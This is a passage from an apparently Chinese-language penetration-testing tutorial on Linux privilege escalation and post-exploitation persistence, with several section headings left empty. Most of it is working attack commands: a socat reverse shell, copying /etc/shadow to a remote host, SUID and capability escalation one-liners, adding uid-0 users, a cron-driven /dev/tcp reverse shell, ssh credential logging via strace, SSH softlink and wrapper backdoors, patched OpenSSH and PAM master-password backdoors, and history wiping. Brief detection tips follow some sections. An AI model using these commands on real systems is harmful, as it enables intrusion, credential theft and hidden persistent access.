![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635857542443-45b0d581-d27a-44c8-9328-2db307f78dc8.png#clientId=uaa5b3761-0b84-4&from=paste&height=91&id=u8c1aa397&margin=%5Bobject%20Object%5D&name=image.png&originHeight=182&originWidth=1609&originalType=binary&ratio=1&size=16832&status=done&style=none&taskId=u31203336-0ffd-48ea-99bc-6da4cf11361&width=804.5)
然后在目标主机上运行以下命令

```php
sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635857714674-c13975d9-09dc-46a3-b365-a8ba0fe10291.png#clientId=uaa5b3761-0b84-4&from=paste&height=78&id=ucc0745b0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=155&originWidth=1484&originalType=binary&ratio=1&size=25843&status=done&style=none&taskId=ub60651c7-c5b6-4d7a-9afd-cf724333c1f&width=742)
成功反弹root权限shell
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635857744950-08bf8ba5-c3eb-4383-8217-70df14b83f37.png#clientId=uaa5b3761-0b84-4&from=paste&height=251&id=u321b4b5f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=501&originWidth=1662&originalType=binary&ratio=1&size=42359&status=done&style=none&taskId=u3f33b678-e601-480d-a736-47f4d40d81e&width=831)
**（4）使用scp命令复制文件**
正如我们所知，sudo权限对于scp是可用的，但不可能获得如上所示的bash shell目录，因为它是一种安全地在本地主机和远程主机之间移动任何文件的方法。因此，我们可以使用它来传输那些需要root权限来执行读/写操作的系统文件，例如/etc/passwd和/etc/shadow文件。
**语法：** scp SourceFile user@host:~/目录路径

```php
sudo scp /etc/passwd root@192.168.1.105:~/
sudo scp /etc/shadow root@192.168.1.105:~/
```

------

### 二、SUID二进制文件提权

**SUID**： SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有SUID权限，那么就可以利用系统中的二进制文件和工具来进行root提权。
#### 1、SUID权限设置
**可以使用"数值4755"或者"符号u+s"给二进制文件赋予SUID权限。如果已经设置了SUID权限，二进制文件所有者的x执行权限会变成s。**
```php
chmod 4755 /usr/bin/find
或
chmod u+s /usr/bin/find
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635848067884-6d16aa9f-1515-40f6-82f9-8045d5d3bd3d.png#clientId=uaa5b3761-0b84-4&from=paste&height=117&id=ufc43ab5a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=233&originWidth=1536&originalType=binary&ratio=1&size=33263&status=done&style=none&taskId=u8509bb58-7aab-41e7-bd6f-6441ef6cc5f&width=768)

#### 2、查找系统SUID文件

```php
find / -perm -u=s -type f 2>/dev/null
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635848204258-7525406e-75b7-4714-9b48-6eacdd65c15c.png#clientId=uaa5b3761-0b84-4&from=paste&height=431&id=u8c723115&margin=%5Bobject%20Object%5D&name=image.png&originHeight=862&originWidth=1702&originalType=binary&ratio=1&size=115591&status=done&style=none&taskId=ubc362897-5057-41b4-bb11-e8b3a5a2634&width=851)

#### 3、SUID提权技巧
在 Linux 中，如果启用了SUID位，非root 用户可以使用一些现有的二进制文件和命令来提升root访问权限。有一些著名的Linux/Unix可执行命令可以允许权限提升：bash、cat、cp、find、less、more、nano、vim等
Linux提权：[https://gtfobins.github.io/#+sudo](https://gtfobins.github.io/#+sudo)​
```php
##find命令
find . -exec /bin/bash -p \; -quit

##bash命令
/bin/bash -p

##nmap
nmap --interactive
nmap> !sh

##cp
cp /etc/passwd /tmp/passwd
vim /tmp/passwd  //编辑passwd文件新增一个管理员用户
cp /etc/passwd /etc/passwd.bal  //备份/etc/passwd文件
cp /tmp/passwd /etc/passwd  //替换/etc/passwd

##vim
vim.tiny
# Press ESC key
:set shell=/bin/sh
:shell

##less
less /etc/passwd
!/bin/sh

##more
more /etc/passwd
!/bin/sh

##awk
awk 'BEGIN {system("/bin/sh")}'

##python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

##git
git help config
!/bin/sh

##php
php -r "pcntl_exec('/bin/sh', ['-p']);"
```
------

### 三、Capabilities提权
#### capabilities介绍
Linux的Root用户拥有最高的权限，可以对几乎系统中的任何文件进行操作。然而普通用户如何操作一些高权限的文件？
在Linux中存在两种方法：

- 第一种是在执行的命令前加上sudo，这样就会以Root的身份进行操作。
- 第二种方法是设置SUID或SGID，这样虽然会以原用户的身份进行操作，但是获得了操作权限。

SUID和SGID存在安全隐患，因为某文件设置了之后普通用户将会获得广范围的操作权限。
为了避免这种安全隐患，Linux内核 2.2 之后引入了Capabilities机制。什么是Capabilities机制哪？
原理很简单，就是将之前与超级用户 root（UID=0）关联的特权细分为不同的功能组，Capabilites 作为线程（Linux 并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。
这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是 root，就去检查其是否具有该特权操作所对应的 capabilities，并以此为依据，决定是否可以执行特权操作。
**细分后的特权：**

| capability 名称 | 描述 |
| --- | --- |
| CAP_AUDIT_CONTROL | 启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则 |
| CAP_AUDIT_READ | 允许通过 multicast netlink 套接字读取审计日志 |
| CAP_AUDIT_WRITE | 将记录写入内核审计日志 |
| CAP_BLOCK_SUSPEND | 使用可以阻止系统挂起的特性 |
| CAP_CHOWN | 修改文件所有者的权限 |
| CAP_DAC_OVERRIDE | 忽略文件的 DAC 访问限制 |
| CAP_DAC_READ_SEARCH | 忽略文件读及目录搜索的 DAC 访问限制 |
| CAP_FOWNER | 忽略文件属主 ID 必须和进程用户 ID 相匹配的限制 |
| CAP_FSETID | 允许设置文件的 setuid 位 |
| CAP_IPC_LOCK | 允许锁定共享内存片段 |
| CAP_IPC_OWNER | 忽略 IPC 所有权检查 |
| CAP_KILL | 允许对不属于自己的进程发送信号 |
| CAP_LEASE | 允许修改文件锁的 FL_LEASE 标志 |
| CAP_LINUX_IMMUTABLE | 允许修改文件的 IMMUTABLE 和 APPEND 属性标志 |
| CAP_MAC_ADMIN | 允许 MAC 配置或状态更改 |
| CAP_MAC_OVERRIDE | 覆盖 MAC(Mandatory Access Control) |
| CAP_MKNOD | 允许使用 mknod() 系统调用 |
| CAP_NET_ADMIN | 允许执行网络管理任务 |
| CAP_NET_BIND_SERVICE | 允许绑定到小于 1024 的端口 |
| CAP_NET_BROADCAST | 允许网络广播和多播访问 |
| CAP_NET_RAW | 允许使用原始套接字 |
| CAP_SETGID | 允许改变进程的 GID |
| CAP_SETFCAP | 允许为文件设置任意的 capabilities |
| CAP_SETPCAP | 参考 [capabilities man page](http://man7.org/linux/man-pages/man7/capabilities.7.html) |
| CAP_SETUID | 允许改变进程的 UID |
| CAP_SYS_ADMIN | 允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等 |
| CAP_SYS_BOOT | 允许重新启动系统 |
| CAP_SYS_CHROOT | 允许使用 chroot() 系统调用 |
| CAP_SYS_MODULE | 允许插入和删除内核模块 |
| CAP_SYS_NICE | 允许提升优先级及设置其他进程的优先级 |
| CAP_SYS_PACCT | 允许执行进程的 BSD 式审计 |
| CAP_SYS_PTRACE | 允许跟踪任何进程 |
| CAP_SYS_RAWIO | 允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备 |
| CAP_SYS_RESOURCE | 忽略资源限制 |
| CAP_SYS_TIME | 允许改变系统时钟 |
| CAP_SYS_TTY_CONFIG | 允许配置 TTY 设备 |
| CAP_SYSLOG | 允许使用 syslog() 系统调用 |
| CAP_WAKE_ALARM | 允许触发一些能唤醒系统的东西(比如 CLOCK_BOOTTIME_ALARM 计时器) |

#### Capabilities使用
**查询**
```php
getcap [路径]

## 查询全部
getcap -r / 2>/dev/null # -r 递归查询   2>/dev/null 错误信息从定向到null
```
**设置**

```php
setcap cap_setuid+ep /home/test/python  //设置时路径要指定源文件，不可以是链接文件，如果报错可以查看是不是路径指定的为链接文件
```
**删除**​
```php
setcap -r [路径]
```
#### Capabilities提权技巧
假设攻击者以本地用户身份入侵了主机并拿到了低权限的 shell，他查找系统功能并发现 suid 上的空功能 (ep) 被赋予 python3 用于提权，这意味着所有权限都分配给该程序的用户，因此，利用此权限，他可以从低权限 shell 升级为高权限。
##### Python提权
```php
getcap -r / 2>/dev/null
/home/test/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
whoami
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636010594005-82354236-7d4f-4177-ab76-c37fa83ea01f.png#clientId=u8b98ab0f-c0ef-4&from=paste&height=301&id=uefb1fd46&margin=%5Bobject%20Object%5D&name=image.png&originHeight=602&originWidth=1616&originalType=binary&ratio=1&size=55683&status=done&style=none&taskId=u6945c4da-8266-4c7d-8d99-7b63b70cad9&width=808)
##### Perl提权
```php
getcap -r / 2>/dev/null
/home/test/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
whoami
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636010704870-d83a53f7-3420-4f25-a9c9-37bb253b863d.png#clientId=u8b98ab0f-c0ef-4&from=paste&height=267&id=u0f9ca838&margin=%5Bobject%20Object%5D&name=image.png&originHeight=534&originWidth=1387&originalType=binary&ratio=1&size=54712&status=done&style=none&taskId=u77ae74a1-1c14-4932-9e96-7259168165d&width=693.5)
##### php提权
```php
getcap -r / 2>/dev/null
/home/test/php -r "posix_setuid(0); system('/bin/sh');"
whoami
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636010921471-1bc7c868-e3a7-40b8-bfc5-bd9ce737d7d1.png#clientId=u8b98ab0f-c0ef-4&from=paste&height=269&id=u059414ff&margin=%5Bobject%20Object%5D&name=image.png&originHeight=538&originWidth=1297&originalType=binary&ratio=1&size=55974&status=done&style=none&taskId=ub31f4fd2-fe9c-4987-8799-fb1a0b98b8c&width=648.5)
**参考：**
[https://www.cnblogs.com/she11s/p/13842280.html](https://www.cnblogs.com/she11s/p/13842280.html)
**​**

------

### 四、利用LXD实现权限提升

------


### 五、利用crontab计划任务提权

------


### 六、/etc/passwd文件可写入提权
该提权是利用/etc/passwd文件的可写入权限，我们可以写入一个管理员用户进去。
#### /etc/passwd文件介绍
Linux系统中的每个用户都在/etc/passwd文件中有一个对应的记录行，它记录了这个用户的一些基本属性。该文件默认权限是除root外全部用户只读权限。它是一个以冒号分隔的文件，按顺序包含信息如下
```php
用户名:加密密码:uid:gid:用户全名:用户家目录:登录Shell
root:x:0:0:root:/root:/usr/bin/zsh
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636019657252-534f138d-e41f-40e6-887b-82bcdf35d6cd.png#clientId=u8b98ab0f-c0ef-4&from=paste&height=331&id=u7e5ea51e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=662&originWidth=1407&originalType=binary&ratio=1&size=130044&status=done&style=none&taskId=ucf475c19-00f4-4cdb-9728-e6df169fdb5&width=703.5)
假设系统管理员配置错误导致/etc/passwd文件可写入权限，我们可写入一个管理员用户来提权
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636020922906-43cdcacc-4882-4933-bc52-4adf7ba4186b.png#clientId=u965a1c38-2462-4&from=paste&height=379&id=ud9646674&margin=%5Bobject%20Object%5D&name=image.png&originHeight=379&originWidth=1145&originalType=binary&ratio=1&size=22803&status=done&style=none&taskId=u4c3de49e-5b5b-46ea-99d8-5a926d9d2c3&width=1145)

#### 写入用户提权
用openssl生成带有盐值的密码
```php
openssl passwd -salt 1 123456
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636020724150-9437abd4-19f6-4eab-8f2b-bcb0d515e6a8.png#clientId=u965a1c38-2462-4&from=paste&height=513&id=ufcc2d867&margin=%5Bobject%20Object%5D&name=image.png&originHeight=513&originWidth=1279&originalType=binary&ratio=1&size=22710&status=done&style=none&taskId=u64967860-dba4-48e2-a717-cdcb71a4ca2&width=1279)
写入一个管理员用户到/etc/passwd文件中
```php
注意：下面用两个>重定向追加到/etc/passwd文件中，用一个>会替换原本/etc/passwd的内容
echo "admin:1AX6szi/kDphw:0:0:test:/home/admin:/bin/bash" >> /etc/passwd
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636020971202-7054020b-286d-4466-88f2-01e8def9c946.png#clientId=u965a1c38-2462-4&from=paste&height=412&id=ud6e8f612&margin=%5Bobject%20Object%5D&name=image.png&originHeight=412&originWidth=1311&originalType=binary&ratio=1&size=34833&status=done&style=none&taskId=u7d1f88ee-af5a-4b05-aa5d-90d83dcea08&width=1311)
登录到admin用户上，成功提权
```php
su - admin
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636021002684-1819c33d-0307-4059-8d66-fb27d262de73.png#clientId=u965a1c38-2462-4&from=paste&height=465&id=ua58f306f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=465&originWidth=1474&originalType=binary&ratio=1&size=38132&status=done&style=none&taskId=ufdf66907-ed80-4166-838a-ae3b508f3ba&width=1474)

------


### 七、利用PATH变量提权
#### PATH变量介绍
PATH是Linux和Unix操作系统中的环境变量，它指定存储所有可执行程序的所有bin和sbin目录。当用户在终端上运行任何命令时，它会请求shell在PATH变量的帮助下搜索可执行文件，以响应用户执行的命令。超级用户通常还具有/sbin和/usr/sbin条目，以便轻松执行系统管理命令。 
**查看系统中的PATH环境变量：**
```php
echo $PATH
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636016806110-702799c3-b7a5-4900-941d-41f293e00f48.png#clientId=u8b98ab0f-c0ef-4&from=paste&height=247&id=uc5185ac1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=493&originWidth=1283&originalType=binary&ratio=1&size=31132&status=done&style=none&taskId=u431bd27d-7b5c-4d72-97a7-9fac9b4ed64&width=641.5)
如果你注意到**'.' **在环境PATH变量中，这意味着登录的用户可以从当前目录执行二进制文件/脚本，这对于攻击者来说是一种提升 root 权限的极好技术。这是由于编写程序时缺乏注意，因此管理员没有指定程序的完整路径。
#### 利用PATH提权技巧
在/bin/目录下，创建一个名为script的新目录。现在在Script目录中，我们将编写一个小的c程序来调用二进制文件的函数
```php
cd /dev/
mkdir script
cd script/
vim test.c
```
以下test.c文件中调用了系统中的ps二进制文件（进程状态）
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636017115915-5e09e786-e253-41c5-a717-07a7967d8e9f.png#clientId=u8b98ab0f-c0ef-4&from=paste&height=266&id=ufa7b2ea0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=532&originWidth=1028&originalType=binary&ratio=1&size=51653&status=done&style=none&taskId=u9570d097-6481-4fe4-aa57-8f9134d6729&width=514)
然后使用 gcc 编译 test.c 文件并将 SUID 权限提升到编译文件。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636017304183-3caa6553-c423-47d7-84a1-928bb1f6bd6d.png#clientId=u8b98ab0f-c0ef-4&from=paste&height=231&id=ua4beca84&margin=%5Bobject%20Object%5D&name=image.png&originHeight=462&originWidth=1047&originalType=binary&ratio=1&size=37480&status=done&style=none&taskId=u2232993e-fa71-447e-aba7-3309d639181&width=523.5)​
假设攻击者已经通过攻击手段获取到了该主机低权限的Shell，然后进入提权阶段，通过find命令查找发现了/bin/script/test文件具有SUID权限
```php
find / -perm -u=s -type f 2>/dev/null
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636017537374-948c9759-4f0f-455a-a5bf-d577c3e36e3a.png#clientId=u8b98ab0f-c0ef-4&from=paste&height=128&id=ufc19bf01&margin=%5Bobject%20Object%5D&name=image.png&originHeight=255&originWidth=1505&originalType=binary&ratio=1&size=84723&status=done&style=none&taskId=ud783f599-0e15-48cf-b55b-437d73480f4&width=752.5)
然后切换到/dev/script目录下执行"test"文件，发现文件调用了系统中的"ps"二进制文件来获取进程状态
```php
cd /dev/script
./test
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636017773519-d9265b78-f38f-496a-987b-e060e898bc4b.png#clientId=u8b98ab0f-c0ef-4&from=paste&height=179&id=ub7d3bc71&margin=%5Bobject%20Object%5D&name=image.png&originHeight=357&originWidth=1223&originalType=binary&ratio=1&size=38367&status=done&style=none&taskId=uca009d77-ecc8-49e6-a202-1361fd4c0fc&width=611.5)
通过修改系统PATH变量来提升权限
大概原理就是系统执行二进制命令或文件时都去系统PATH环境变量中查找路径，此时我们在/tmp目录下创建一个ps文件，然后修改PATH环境变量将/tmp目录放到前面，最后执行/dev/script/test文件就会自动去/tmp目录下执行我们创建的ps文件，最后达到提权的效果。
```php
cd /tmp
echo "/bin/bash -p" > ps
chmod 777 ps
export PATH=/tmp:$PATH
/dev/script/test
whoami
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636018525433-da414b89-b377-436a-bc63-59d99186372b.png#clientId=u8b98ab0f-c0ef-4&from=paste&height=218&id=uf61be796&margin=%5Bobject%20Object%5D&name=image.png&originHeight=436&originWidth=1232&originalType=binary&ratio=1&size=49752&status=done&style=none&taskId=u5f1c90ce-6fd0-463e-ba58-b43963f9f24&width=616)

**

------

### 八、LD_Preload 权限提升

------


### 九、Python库劫持权限提升

------


### 十、Docker权限提升

------

### 十一、NFS配置不当导致Linux权限提升



------


### 十二、利用通配符权限提升

------

### 十三、利用内核漏洞进行提权




参考资料：
[https://blog.csdn.net/qq_39101049/article/details/99896459](https://blog.csdn.net/qq_39101049/article/details/99896459)



------

## 0x04 权限维持

### 一、增加超级用户

**1、系统允许uid=0用户远程登陆:**
```php
openssl passwd -1 -salt test 123456  //使用OpenSSL生成加密密码
echo "test:$1$test$at615QShYKduQlx5z9Zm7/:0:0::/:/bin/sh" >> /etc/passwd  //创建test超级用户
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635910977533-849d770b-6e6c-4b57-9c84-5ecef8ac5201.png#clientId=u38131c10-6bca-4&from=paste&height=427&id=u9b2786ea&margin=%5Bobject%20Object%5D&name=image.png&originHeight=427&originWidth=1030&originalType=binary&ratio=1&size=129872&status=done&style=none&taskId=ufd07e28b-aeaa-41c1-a5b0-a52dff76696&width=1030)
**2、系统不允许uid=0用户远程登陆:**

```php
useradd -p `openssl passwd -1 -salt 'salt' 123456` test		//创建一个test的普通用户
gpasswd -a wheel test				//将其添加到wheel组中,默认wheel组允许使用sudo执行命令
```
**排查技巧：awk -F: '$3==0{print $1}' /etc/passwd  //查询特权用户（uid=0的用户）**

------


### 二、放置SUID Shell
SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有SUID权限，那么就可以利用系统中的二进制文件和工具来进行root提权。
**1、放置一个SUID shell到/tmp目录下**
```php
cp /bin/bash /tmp/.shell
chmod u+s /tmp/.shell
```
**2、普通用户在本机运行/tmp/shell，即可获得一个root权限的shell。**

```php
/tmp/.shell -p    //bash2针对suid做了一些防护措施,需要加-p才可以
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635914092077-2e596b05-063e-41b0-bcbd-04a40edbd96e.png#clientId=u0baf92fe-f18f-4&from=paste&height=258&id=u0b165154&margin=%5Bobject%20Object%5D&name=image.png&originHeight=516&originWidth=933&originalType=binary&ratio=1&size=604533&status=done&style=none&taskId=u19bc66c2-83f9-4d75-b38d-293825c933b&width=466.5)
**3、 排查技巧：在Linux中查找SUID设置的文件：find / -perm /4000 **
​ 

 

------

### 三、ssh 公钥免密

在客户端上生成一对公私钥，然后把公钥放到服务器上（~/.ssh/authorized_keys），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配。如果匹配成功就可以登录了。
**1、本地生成密钥对**

```php
ssh-keygen -t rsa
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635914945818-4f8dd5d5-3d63-49d6-9b61-9c83431b9135.png#clientId=u0baf92fe-f18f-4&from=paste&height=281&id=u0d7ff801&margin=%5Bobject%20Object%5D&name=image.png&originHeight=562&originWidth=1920&originalType=binary&ratio=1&size=105677&status=done&style=none&taskId=ua5d8592a-e197-4cb2-8fdc-dc97fb5ebc3&width=960)
**2、 把id_rsa.pub写入目标主机的authorized_keys中**

```php
echo "ssh-rsa   AAAAB3NzaC1yc2EAAAADAQABAAABAQDjeYnCJy9dC7PcBhhdcx8IO/QvnaucVl9LBA7lFMSqvIIKy9QZ/J2r1aqLgrUqsTxtZDSGcpkHqKQmy2EZXCIydyK3jvuzfkoTFPlxb4zPl6jnarjE99/xqUll+dPv7V9c8/j9A0rEKyLukT5KpeIBu67EOaFyxQsqlWQZIKJiQx1DPTF8FFVYFmbCehv7WFivT5I3mFP/QMWFdwkjnonkStwnLM7/kuIrYh3FNx6IHelb0xvXHCS+9VZlS+PlnNTH7Ec3++LEJoPrxkawJfzpAANwYyEw1PE7qYcyikTVnKWFG94ltEmhgyMofnScBv1YOQRGJKC7esM65R0yvPyd root@security" >> /root/.ssh/authorized_keys
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635915310952-4b93f407-5ece-4849-8cd3-085c7bcabf2c.png#clientId=u0baf92fe-f18f-4&from=paste&height=125&id=u53af83fd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=250&originWidth=1619&originalType=binary&ratio=1&size=537301&status=done&style=none&taskId=u3ce50d6e-f265-40e6-8df9-3f5eee22587&width=809.5)
**3、 本地主机无密码ssh登陆到目标主机**

```php
ssh root@192.168.1.135
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635915523077-c563a098-f8a8-41b1-9499-4a91f28a6de0.png#clientId=u0baf92fe-f18f-4&from=paste&height=376&id=uc714db9e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=752&originWidth=1297&originalType=binary&ratio=1&size=133050&status=done&style=none&taskId=uab3697f5-b172-4d2a-8dba-270f5fd4562&width=648.5)
** 排查技巧：查看/root/.ssh/authorized_keys是否被修改。**

------


### 四、Crontab后门
crontab命令被用来提交和管理用户的需要周期性执行的任务，与windows下的计划任务类似，当安装完成操作系统后，默认会安装此服务工具，并且会自动启动crond进程，crond进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。
**1、创建shell脚本，例如在/etc/evil.sh**
```php
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.136/12345  0>&1
```
**2、crontab -e 设置定时任务**
```php
*/1 * * * * /etc/evil.sh  //每分钟执行一次，-e选项设置计划任务无需加用户名
```
**3、赋予/etc/evil.sh执行权限**
```php
chmod +x /etc/evil.sh
```
**4、重启crond服务，service crond restart，然后就可以用nc接收shell。**
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635918791553-1ed6fefd-7441-40dc-8a03-63982629aad1.png#clientId=u0baf92fe-f18f-4&from=paste&height=218&id=u0c74f844&margin=%5Bobject%20Object%5D&name=image.png&originHeight=436&originWidth=1293&originalType=binary&ratio=1&size=448971&status=done&style=none&taskId=uc73b7656-3a20-43ab-984f-5824a04ed20&width=646.5)
** 排查技巧：crontab -e查看可疑的定时任务列表**
**​**

------

### 五、alias 后门
通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。
```php
#vim /etc/bashrc
alias ssh='strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh'
# source /root/.bashrc
```
**排查技巧：使用alias即可发现异常。**

------


### 六、SSH软链接后门
   在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 /tmp/su 在/etc/pam.d/目录下寻找对应的PAM配置文件(如: /etc/pam.d/su)，任意密码登陆的核心是auth sufficient pam_rootok.so，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。
**1、在目标主机创建一个su软连接指向/usr/sbin/sshd服务，然后运行su软连接，监听31337端口**

```php
ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635916498504-be88cff9-891e-405d-8e7a-a3945a0cd4c9.png#clientId=u0baf92fe-f18f-4&from=paste&height=91&id=ud0a26012&margin=%5Bobject%20Object%5D&name=image.png&originHeight=181&originWidth=1514&originalType=binary&ratio=1&size=353390&status=done&style=none&taskId=ua6abcd16-bd80-43d4-a1a5-b9a11f4e193&width=757)
**2、任意主机可以ssh登录到目标主机上，无需密码**
```php
ssh root@192.168.1.135 -p 31337
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635916445776-94cf75b4-1d32-4da6-b2e3-cc27cf16b480.png#clientId=u0baf92fe-f18f-4&from=paste&height=241&id=u03a6de0e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=481&originWidth=1402&originalType=binary&ratio=1&size=34376&status=done&style=none&taskId=ud973bed4-4a8e-4d2e-a1da-4602ab71bc0&width=701)
** 排查技巧：进程、端口都可以发现异常， kill -s 9 PID 结束进程即可清除后门。**
## 
------

### 七、SSH wrapper后门
init首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell。
```php
cd /usr/sbin/
mv sshd ../bin/
echo '#!/usr/bin/perl' >sshd
echo 'exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);' >>sshd
echo 'exec{"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
chmod u+x sshd
service sshd restart
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635916693522-d1251728-cb78-494a-9efb-cfcfff247b27.png#clientId=u0baf92fe-f18f-4&from=paste&height=183&id=u947af7a9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=366&originWidth=1740&originalType=binary&ratio=1&size=795293&status=done&style=none&taskId=uf7746fb8-417f-4193-9b5d-f56a78a2076&width=870)
连接：​

```php
socat STDIO TCP4:192.168.1.135:22,sourceport=13377  //默认端口需要为13377
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635916895767-9062e2d7-9e1a-4d4b-a0ac-3baf9669f58b.png#clientId=u0baf92fe-f18f-4&from=paste&height=282&id=u23ef0ca4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=564&originWidth=1225&originalType=binary&ratio=1&size=28979&status=done&style=none&taskId=u2e3090bb-eb41-4873-a188-d14c01cd365&width=612.5)

https://blog.csdn.net/qq_39101049/article/details/99896459

------

### 八、openssh后门
利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现。
```php+HTML
a、备份SSH配置文件
mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old
mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old

b、解压并安装补丁
tar zxf openssh-5.9p1.tar.gz
tar zxf openssh-5.9p1.tar.gz
cp openssh-5.9p1.patch/sshbd5.9p1.diff  /openssh-5.9p1
cd openssh-5.9p1
patch < sshbd5.9p1.diff

c、记录用户名和密码的文件位置及其密码
vi  includes.h
    #define ILOG "/tmp/1.txt"             //记录登录本机的用户名和密码
    #define OLOG "/tmp/2.txt"             //记录本机登录远程的用户名和密码
    #define SECRETPW "123456789"          //后门的密码

d、修改版本信息
vi version.h
    #define SSH_VERSION "填入之前记下来的版本号,伪装原版本"
    #define SSH_PORTABLE "小版本号"

e、安装并编译
./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
make clean
make && make install
service sshd restart

f、对比原来的配置文件，使配置文件一致，然后修改文件日期。

touch -r  /etc/ssh/ssh_config.old /etc/ssh/ssh_config
touch -r  /etc/ssh/sshd_config.old /etc/ssh/sshd_config

g、清除操作记录
export HISTFILE=/dev/null
export HISTSIZE=0
echo >/root/.bash_history //清空操作日志
```
**排查技巧：利用strace找出ssh后门.**
```php
# 1、获取可疑进程PI
ps aux | grep sshd
# 2、跟踪sshd PID
strace -o aa -ff -p  PID
# 3、查看记录密码打开文件
grep open sshd* | grep -v -e No -e  null -e denied| grep  WR
```

------


### 九、PAM后门
PAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM最初是集成在Solaris中，目前已移植到其它系统中，如Linux、SunOS、HP-UX 9.0等。
利用方法:
```php
1、获取目标系统所使用的PAM版本，下载对应版本的pam版本
2、解压缩，修改pam_unix_auth.c文件，添加万能密码
3、编译安装PAM
4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。
```
**排查技巧：**

```php
# 1、通过Strace跟踪ssh
ps axu | grep sshd
strace -o aa -ff -p PID
grep open aa* | grep -v -e No -e null -e denied| grep WR
# 2、检查pam_unix.so的修改时间
stat /lib/security/pam_unix.so      #32位
stat /lib64/security/pam_unix.so    #64位
```


------

### **十、rookit后门**
Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现让攻击者远程登陆的，特点是配置简单并可以自定义验证密码和端口号。
